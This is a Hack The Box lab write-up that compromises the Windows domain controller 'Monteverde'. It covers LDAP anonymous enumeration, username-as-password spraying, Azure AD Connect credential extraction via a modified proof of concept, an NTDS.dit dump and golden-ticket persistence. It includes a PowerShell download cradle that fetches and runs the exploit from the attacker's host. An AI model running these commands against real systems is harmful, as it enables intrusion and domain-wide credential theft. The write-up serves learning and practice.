+++
tags = ["Box", "HTB", "Medium", "Windows", "LDAP", "Active Directory", "Azure AD Connect", "Azure", "SQL", "MSSQL"]
draft = true
title = "Monteverde HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-14
+++

## Monteverde Hack The Box Walkthrough/Writeup: {#monteverde-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Monteverde>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$pass` = Passwords I have access to.
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
          🕙 11:24:32 zsh ❯ nmap $box -Pn -oA basicScan
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 11:24 BST
          Nmap scan report for 10.129.228.111
          Host is up (0.040s latency).
          Not shown: 989 filtered tcp ports (no-response)
          PORT     STATE SERVICE
          53/tcp   open  domain
          88/tcp   open  kerberos-sec
          135/tcp  open  msrpc
          139/tcp  open  netbios-ssn
          389/tcp  open  ldap
          445/tcp  open  microsoft-ds
          464/tcp  open  kpasswd5
          593/tcp  open  http-rpc-epmap
          636/tcp  open  ldapssl
          3268/tcp open  globalcatLDAP
          3269/tcp open  globalcatLDAPssl

          Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds


        ```
    -   **Initial thoughts**:
        -   DNS, Kerberos, LDAP &amp; SMB give us great starting points for enumeration.

-   **In depth scan**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
        ```shell

          kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 12s
          🕙 11:24:49 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 11:25 BST
          Nmap scan report for 10.129.228.111
          Host is up (0.071s latency).
          Not shown: 65516 filtered tcp ports (no-response)
          PORT      STATE SERVICE       VERSION
          53/tcp    open  domain        Simple DNS Plus
          88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-13 10:28:37Z)
          135/tcp   open  msrpc         Microsoft Windows RPC
          139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
          389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
          445/tcp   open  microsoft-ds?
          464/tcp   open  kpasswd5?
          593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
          636/tcp   open  tcpwrapped
          3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
          3269/tcp  open  tcpwrapped
          5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-server-header: Microsoft-HTTPAPI/2.0
          |_http-title: Not Found
          9389/tcp  open  mc-nmf        .NET Message Framing
          49667/tcp open  msrpc         Microsoft Windows RPC
          49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
          49674/tcp open  msrpc         Microsoft Windows RPC
          49676/tcp open  msrpc         Microsoft Windows RPC
          49696/tcp open  msrpc         Microsoft Windows RPC
          49796/tcp open  msrpc         Microsoft Windows RPC
          Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
          Device type: general purpose
          Running (JUST GUESSING): Microsoft Windows 2019 (88%)
          Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
          No exact OS matches for host (test conditions non-ideal).
          Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

          Host script results:
          | smb2-time:
          |   date: 2024-10-13T10:29:42
          |_  start_date: N/A
          | smb2-security-mode:
          |   3:1:1:
          |_    Message signing enabled and required

          OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
          Nmap done: 1 IP address (1 host up) scanned in 304.90 seconds

        ```
    -   **Findings**:
        -   SMB Signing is enabled so no relay attacks.
        -   We seem to be dealing with server 2019.


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

<!--listend-->

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>
        -   `python3 ldapchecker.py $box`

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools 🐍 v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 11:25:54 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.228.111 with SSL...
        Failed to connect with SSL. Retrying without SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=MEGABANK,DC=LOCAL
            CN=Configuration,DC=MEGABANK,DC=LOCAL
            CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
            DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
            DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=MEGABANK,DC=LOCAL
          ldapServiceName:
            MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) So it appears it's a printer server site of some sort. What is also interesting is the CN name "Configuration", this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.
            ```shell
            serverName:
                CN=MONTEVERDE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGABANK,DC=LOCAL
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


#### LDAP User Enumeration: {#ldap-user-enumeration}

-   **As anonymous bind is enabled we can enumerate all the users on the domain also**:
    -   `ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b "DC=MEGABANK,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" " >> ldapUsers.txt`
    -   {{< figure src="/ox-hugo/2024-10-13-115134_.png" >}}

-   **Discoveries**:
    -   Looking at the file we can see it's a small list of users, but most noticeably there are also a series of services running which is interesting. However we can confirm this is an Azure Active Directory environment as there is a user called: `AAD_987d7f2f57d2`
        -   Azure AD often uses unique object identifiers like `AAD_987d7f2f57d2` to represent accounts or resources internally.
    -   {{< figure src="/ox-hugo/2024-10-13-115430_.png" >}}
    -   I add all the users to my users list.


#### LDAP Group Enumeration: {#ldap-group-enumeration}

-   **We can also enumerate the groups on the domain**:
    -   `ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b "DC=MEGABANK,DC=LOCAL" -s sub "(&(objectclass=group))" | grep sAMAccountName: | cut -f2 -d" " >> ldapGroups.txt`
    -   {{< figure src="/ox-hugo/2024-10-13-115302_.png" >}}

-   **Discoveries**:
    -   Looking at the list of groups there are some interesting standout groups here:
        -   {{< figure src="/ox-hugo/2024-10-13-115619_.png" >}}
        -   SQLServer2005SQLBrowserUser$MONTEVERDE
            -   This is interesting as it does not appear the SQL service is running publicly on a port.
        -   Azure
            -   This could be part of an azure environment which could be interesting.
        -   Reception
        -   Operations
        -   Trading
        -   HelpDesk
        -   Developers

<!--listend-->

-   **We can also generate a list of users who are members of specific groups too**:
    -   `for group in $(cat ldapGroups.txt); do ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b "DC=MEGABANK,DC=LOCAL" -s sub "(&(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=$group,OU=Groups,DC=MEGABANK,DC=LOCAL))" >> ldapGroupMemberships.txt; done`
    -   {{< figure src="/ox-hugo/2024-10-13-115406_.png" >}}


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-10-13-131201_.png" >}}
    -   Standard entries for an AD env.


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   As kerberos is present we can enumerate users using [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
-   {{< figure src="/ox-hugo/2024-10-13-120053_.png" >}}
-   We have some usernames, these were all found using LDAP, however this is still good to have.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-10-13-121259_.png" >}}
-   Guest account is disabled and null sessions are not allowed it appears.


#### Trying Usernames as Passwords: {#trying-usernames-as-passwords}

-   **I always try usernames as passwords as well**:
    -   `netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]`
    -   {{< figure src="/ox-hugo/2024-10-13-121723_.png" >}}
    -   It appears that `SABatchJobs` is using their username as a password, naught naughty.


## 2. Foothold: {#2-dot-foothold}


### Enumerating the Domain `SABatchJobs`: {#enumerating-the-domain-sabatchjobs}


#### Running a bloodhound collection: {#running-a-bloodhound-collection}

-   **As we have creds now we can run a remote bloodhound collection**:
    -   `python3 bloodhound.py -dc monteverde.$domain -c All -u $user -p $user -d $domain -ns $box`
    -   {{< figure src="/ox-hugo/2024-10-13-123402_.png" >}}
    -   +Note+: The reason this keeps going and I do not check it initially is as it was running the collection I continued to manually enumerate.


#### Enumerating `SMB` Shares: {#enumerating-smb-shares}

-   **Listing the shares we can see some interesting entries**:
    -   `netexec smb $box -u $user -p $user --shares`
    -   {{< figure src="/ox-hugo/2024-10-13-122221_.png" >}}
    -   The `azure_uploads` &amp; `users$` is particularly interesting.

<!--listend-->

-   **I check the** `azure_uploads` **directory but it is empty**:
    -   `smbclient -U $domain\\$user \\\\$box\\azure_uploads`
    -   {{< figure src="/ox-hugo/2024-10-13-125020_.png" >}}


#### Finding `azure.xml` in the user `mhope`'s user share: {#finding-azure-dot-xml-in-the-user-mhope-s-user-share}

-   **Enumerating the** `users$` **shares I find a file called** `azure.xml` **in the user's** `mhope` **directory**:
    -   `smbclient -U $domain\\$user \\\\$box\\users$`
    -   {{< figure src="/ox-hugo/2024-10-13-125250_.png" >}}
    -   I download it:
        -   {{< figure src="/ox-hugo/2024-10-13-125458_.png" >}}


### Finding a hard-coded password in `azure.xml`: {#finding-a-hard-coded-password-in-azure-dot-xml}

-   **Reading the** `azure.xml` **file I find a hard-coded password within it**:
    -   {{< figure src="/ox-hugo/2024-10-13-125600_.png" >}}


### Discovering that `mhope` re-uses passwords: {#discovering-that-mhope-re-uses-passwords}

-   **I check the password for re-use and it appears that** `mhope` **re-uses passwords**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-10-13-130331_.png" >}}


### Connecting to the host as `mhope`: {#connecting-to-the-host-as-mhope}

-   **I connect using** `evil-winrm`:
    -   `evil-winrm -i $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-10-13-131028_.png" >}}
    -   After some general enumeration I elect to check bloodhound to see if we have any obvious privilege escalation paths.


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Discovering `mhope` is part of the `azure admins` group: {#discovering-mhope-is-part-of-the-azure-admins-group}

-   **Checking bloodhound I can see that mhope is a part of the** `azure admins` **group**:
    -   {{< figure src="/ox-hugo/2024-10-13-131334_.png" >}}

-   I quickly check for Azure Admin privilege escalation path on google and find the following article:
    -   <https://blog.xpnsec.com/azuread-connect-for-redteam/>
    -   So we need to find out if Azure Connect is running before this is a viable privilege escalation path.


### Enumerating the Azure Service: {#enumerating-the-azure-service}


#### Checking Azure Connect Directory Exists &amp; The Service Is Running: {#checking-azure-connect-directory-exists-and-the-service-is-running}

-   **I check if Azure connect AD Sync directory exists**:
    -   `Test-Path "C:\Program Files\Microsoft Azure AD Sync"`
    -   {{< figure src="/ox-hugo/2024-10-14-092223_.png" >}}
    -   True, so this could work. Lets enumerate further.

-   **Let's check if the AD Sync binary is installed**:
    -   `Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync -Name "ImagePath"`
    -   {{< figure src="/ox-hugo/2024-10-14-092605_.png" >}}
    -   So it's running, good.


#### Checking for the `ADSync` Database: {#checking-for-the-adsync-database}

-   **From reading the article, we can see that** `LocalDB` **should be running on a default installation**:
    -   It says:

        > Now by default when deploying the connector a new database is created on the host using SQL Server’s LOCALDB. To view information on the running instance, we can use the installed SqlLocalDB.exe tool:
        >    &lt;SNIP&gt;
        > So what are the requirements to complete this exfiltration of credentials? Well we will need to have access to the LocalDB (if configured to use this DB)


#### What is SQL Server Express `LocalDB`? {#what-is-sql-server-express-localdb}

-   **Overview of** `LocalDB`:
    -   LocalDB is a lightweight version of SQL Server Express designed for developers to quickly and easily create and test SQL Server databases without the overhead of a full SQL Server installation.

<!--list-separator-->

-  Key Features of `LocalDB`:

    -   **Developer-focused**: It’s intended for development and local testing purposes, providing a simple and fast setup for SQL Server database instances.
    -   **On-demand**: LocalDB runs on-demand, meaning it starts up when an application tries to connect and shuts down when not in use, minimizing resource usage.
    -   **User-level instance**: LocalDB runs under the user’s context, without requiring admin privileges to manage or install.
    -   **No configuration needed**: Unlike a full SQL Server instance, LocalDB doesn't require setup or configuration—it's essentially plug-and-play.
    -   **SQL Server API compatibility**: LocalDB supports the same T-SQL commands and APIs as the full version of SQL Server, so code written against LocalDB will work with any edition of SQL Server.

<!--list-separator-->

-  Use Cases of `LocalDB`:

    -   **Development environment**: Ideal for developers needing a local SQL Server database without complex configuration or high resource use.
    -   **Testing and debugging**: Developers can create, test, and debug SQL Server applications in a contained environment before deploying to a full SQL Server instance.
    -   **Unit testing**: Allows database-related unit testing to be performed locally and quickly.

<!--list-separator-->

-  Core Characteristics of `LocalDB`:

    -   **Instance Type**:
        -   LocalDB runs as a user-mode process, meaning it's user-specific and does not require a system-wide installation of SQL Server.
        -   Each user on a machine can have their own instances of LocalDB.

    -   **Communication via Named Pipes**:
        -   Unlike full SQL Server instances that communicate via TCP/IP ports, LocalDB uses named pipes for connections, ensuring simplicity and security for local communication.

    -   **No Service Required**:
        -   LocalDB does not run as a Windows service. It is an on-demand process that starts and stops as needed when an application makes a connection.

    -   **Supports Multiple Instances**:
        -   You can run multiple LocalDB instances, such as the default instance (MSSQLLocalDB) or custom-named instances. Each instance is independent and isolated from others.

    -   **Further reading**:
        -   <https://learn.microsoft.com/en-us/sql/tools/sqlLocalDB-utility?view=sql-server-ver16>


#### Looking for `LocalDB` binary: {#looking-for-localdb-binary}

-   **Looking online I find** [this article](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/sql-server-express-LocalDB?view=sql-server-ver16) **which says where the** `SqlLocalDB.exe` **should be found**:
    -   `"C:\Program Files\Microsoft SQL Server\160\Tools\Binn\SqlLocalDB.exe"`
    -   {{< figure src="/ox-hugo/2024-10-14-111153_.png" >}}
    -   Not found.

-   **Searching for** `SqlLocalDB.exe`
    -   Looking at the folder structure of:
        -   `"C:\Program Files\Microsoft SQL Server"`
        -   {{< figure src="/ox-hugo/2024-10-14-111302_.png" >}}
        -   I can see that there is no `160` folder.

-   **Looking online, I find** [this post](https://stackoverflow.com/questions/36157191/sql-server-how-to-find-all-LocalDB-instance-names#36157192) **on StackOverflow**:
    -   {{< figure src="/ox-hugo/2024-10-14-120119_.png" >}}
    -   It says we should be able to find the binary in either `"C:\Program Files\Microsoft SQL Server\110\Tools\Binn` or  `"C:\Program Files\Microsoft SQL Server\120\Tools\Binn`
    -   As there is no `120` on our host I check `110`


#### Finding `SQLCMD.EXE` in 110: {#finding-sqlcmd-dot-exe-in-110}

-   **I check** `110` **&amp; can see that there is no** `SqlLocalDB.exe` **but there is a** `SQLCMD.EXE` **executable**:
    -   {{< figure src="/ox-hugo/2024-10-14-120844_.png" >}}
    -   I check the other folders `140, 150, 80` &amp; `90` but there is nothing of interest.
    -   `SQLCMD.EXE` is used for interacting with local/remote SQL instances.

-   **We did not see SQL running in our** `NMAP` **scans, so should check if it's running internally**:
    -   `netstat -ano | findstr :1433`
    -   {{< figure src="/ox-hugo/2024-10-14-092511_.png" >}}
    -   Okay, looks to be running internally, which means this is a non-standard installation of Azure AD Connect that isn't using `LocalDB`, so it must be running `SQL`.


### Connecting to the `SQL` Instance: {#connecting-to-the-sql-instance}

-   **I check if we can run commands on the** `SQL` **Instance**:
    -   `sqlcmd -S MONTEVERDE -Q "SELECT name FROM master.dbo.sysdatabases"`
    -   {{< figure src="/ox-hugo/2024-10-14-124549_.png" >}}
    -   We can &amp; I can see that the `ADSync` database is present!


## 4. Ownership: {#4-dot-ownership}


### Modifying XPN's POC to work: {#modifying-xpn-s-poc-to-work}

-   **Looking at the POC on XPN's page we can see the opening line says**:
    ```powershell
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
    ```

    -   <https://blog.xpnsec.com/azuread-connect-for-redteam/>

-   **However this instance is not using `localdb` so we need to modify this**:
    -   `Data Source=(localdb)\.\ADSync`: Uses `localdb`, a lightweight version of SQL Server primarily meant for developers (which is not running).
    -   The `(localdb)\.\ADSync` points to a specific instance of `LocalDB`.
    -   `Initial Catalog=ADSync`: Specifies the database `ADSync` that we want to connect to.

-   **Updated Version**:
    ```powershell
        $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
    ```

    -   `Server=127.0.0.1`: Uses the local machine's loopback address (`127.0.0.1`) to connect to the SQL Server instance.
        -   As we know that SQL is running internally.
    -   `Integrated Security=True`: This enables Windows Authentication, using the current user's credentials to authenticate with the SQL Server.
        -   As we know `mhope` has the required permissions to connect to the instance:

- **I actually did a deep dive into how this whole attack works, you can find it here**: 
  - https://bloodstiller.com/articles/azureadconnect/

### Running the Exploit to Extract the Administrator Password: {#running-the-exploit-to-extract-the-administrator-password}

-   **I start my python webserver**:
    -   `python3 -h http.server 9000`

-   **I use a download cradle to run the exploit**:
    -   `iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectPOC.ps1')`
    -   {{< figure src="/ox-hugo/2024-10-14-131101_.png" >}}
    -   We get the administrators password.

-   **I verify the password works using netexec**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-10-14-131529_.png" >}}

-   **Let's grab our** `root` **flag too**.
    -   {{< figure src="/ox-hugo/2024-10-14-142516_.png" >}}


## 5. Persistence: {#5-dot-persistence}


### Dumping `NTDS.dit`: {#dumping-ntds-dot-dit}

-   **I use netexec to dump the** `NTDS.dit`:
    -   `netexec smb $box -u $user -p $pass -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-10-14-133224_.png" >}}


### Creating a Golden Ticket: {#creating-a-golden-ticket}

1.  **Using** `impacket-lookupsid` **to extract the domain** `SID`:
    -   `impacket-lookupsid $domain/administrator@$box -domain-sids`
    -   {{< figure src="/ox-hugo/2024-10-14-133649_.png" >}}

2.  **I use** `impacket-ticketer` **to create the ticket**:
    -   {{< figure src="/ox-hugo/2024-10-14-135546_.png" >}}
    -   It kicks out a bunch of errors but creates the `administrator.ccache`

3.  **I load the ticket into the** `KRB5CCNAME` **Variable**:
    -   `export KRB5CCNAME=./administrator.ccache`
    -   {{< figure src="/ox-hugo/2024-10-14-135651_.png" >}}

4.  **I sync my clock with the target**:
    -   `sudo ntpdate -s monteverde.$domain`
    -   {{< figure src="/ox-hugo/2024-10-14-140010_.png" >}}

5.  **I connect using** `impacket-psexec`:
    -   `impacket-psexec monteverde.$domain -k`
    -   {{< figure src="/ox-hugo/2024-10-14-135821_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned ALOT about Azure AD Connect. I would not have been able to do this without the post from `xpn`:
    -   <https://blog.xpnsec.com/azuread-connect-for-redteam/>
2.  Honestly so much about the AD Connect service. I have done a more thorough writeup and have actually broken down `xpn`'s exploit in this post:
    -   <https://bloodstiller.com/articles/azureadconnect/>


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Not too bad this time, it was more about just getting my head around Azure AD Connect and understanding XPN's script took me the longest


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


